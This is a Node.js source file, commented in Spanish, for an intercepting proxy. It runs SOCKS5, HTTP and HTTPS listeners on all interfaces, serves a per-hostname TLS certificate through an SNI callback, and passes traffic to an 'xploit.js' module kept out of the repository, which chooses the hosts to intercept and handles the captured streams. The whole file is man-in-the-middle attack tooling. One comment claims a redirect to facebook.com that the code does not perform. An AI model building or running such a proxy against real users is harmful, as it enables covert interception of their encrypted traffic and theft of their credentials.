// no se puede usar npm install como normalmente se haria
// porque hay que modificar la libreria con nuestra propia version
var argyle = require('./lib/argyle/index.js');
var http = require("http");
var https = require("https");
var fs = require("fs");
var crypto = require("crypto");

// este archivo NO esta en el repo
var xploit = require('./xploit.js');

var httpProxy = require('http-proxy');
var localPort = 8080;
var httpsLocalPort = 8443;

var lastSocksHost;
var lastSocksPort;

// redirige todos los requests a facebook.com
var proxy = httpProxy.createProxyServer({});
var httpServer = http.createServer(function(req, res) {
  var target;
  if (req.headers.host) {
    target = 'http://' + req.headers.host;
  } else {
    target = lastSocksHost + ":" + lastSocksPort;
  }

  var streams = xploit.interceptStreams(req, res);
  proxy.web(streams.req, streams.res, { target: target });
});
httpServer.listen(localPort, '0.0.0.0');

function getCredentialsContext (hostname) {
  return crypto.createCredentials({
    key: fs.readFileSync('keys/'+hostname+'/ssl-server.key'),
    cert: fs.readFileSync('keys/'+hostname+'/ssl-server.crt')
  }).context;
}

var options = {
  key: fs.readFileSync('keys/ssl-server.key'),
  cert: fs.readFileSync('keys/ssl-server.crt'),
  SNICallback: function(hostname){
    try {
      console.log("Usando certificado para " + hostname);
      return getCredentialsContext(hostname);
    } catch(e) {
      console.log(e);
      return null
    }
  }
};


var httpsServer = https.createServer(options, function (req, res) {
  var target;
  if (req.headers.host) {
    target = 'https://' + req.headers.host;
  } else {
    target = lastSocksHost + ":" + lastSocksPort;
  }

  var streams = xploit.interceptStreams(req, res);
  proxy.web(streams.req, streams.res, { target: target });
});
httpsServer.listen(httpsLocalPort, '0.0.0.0');

var regex_hostport = /^([^:]+)(:([0-9]+))?$/;
function getHostPortFromString( hostString, defaultPort ) {
  var host = hostString;
  var port = defaultPort;
 
  var result = regex_hostport.exec( hostString );
  if ( result != null ) {
    host = result[1];
    if ( result[2] != null ) {
      port = result[3];
    }
  }
 
  return( [ host, port ] );
}

var net = require("net");

var hostPortFilter = function(host, port) {
  var intercept = xploit.shouldIntercept(host, port);
  if (intercept) {
    lastSocksHost = host;
    lastSocksPort = port;

    if (intercept === "http") {
      return {host: '127.0.0.1', port: localPort};
    } else {

      console.log("interceptar https");

      try {
        getCredentialsContext(host)
        return {host: '127.0.0.1', port: httpsLocalPort};
      } catch (e) {
        console.log("ERROR: no se puede interceptar " + host + ":" + port + ", certificado no disponible");
        return {host: host, port: port};
      }
    }
  } else {
    return {host: host, port: port};
  }
};

var debugging = true;

var httpServerConnectListener = function(request, socketRequest, bodyhead) {
  var url = request.url;
  var httpVersion = request['httpVersion'];

  var hostport = getHostPortFromString( url, 443 );
  var proxySocket = new net.Socket();

  var hostPort = hostPortFilter(hostport[0], parseInt(hostport[1]));

  proxySocket.connect(
    parseInt( hostPort.port), hostPort.host,
    function () {
      proxySocket.write( bodyhead );
      // tell the caller the connection was successfully established
      socketRequest.write( "HTTP/" + httpVersion + " 200 Connection established\r\n\r\n" );
    }
  );

  proxySocket.pipe(socketRequest);
  socketRequest.pipe(proxySocket);

  proxySocket.on(
    'error',
    function ( err ) {
      socketRequest.write( "HTTP/" + httpVersion + " 500 Connection error\r\n\r\n" );
      if ( debugging ) {
        console.log( '  < ERR: %s', err );
      }
      socketRequest.end();
    }
  );

  socketRequest.on(
    'error',
    function ( err ) {
      if ( debugging ) {
        console.log( '  > ERR: %s', err );
      }
      proxySocket.end();
    }
  );
};

httpServer.addListener('connect', httpServerConnectListener);
// este es un proxy socks5 normal
var socksServer = argyle(8888, '0.0.0.0');
socksServer.hostPortFilter = hostPortFilter;

socksServer.on('connected', function(req, dest) {
    // aca no se puede interceptar nada, esto es trafico encriptado
    req.pipe(dest);
    dest.pipe(req);
});

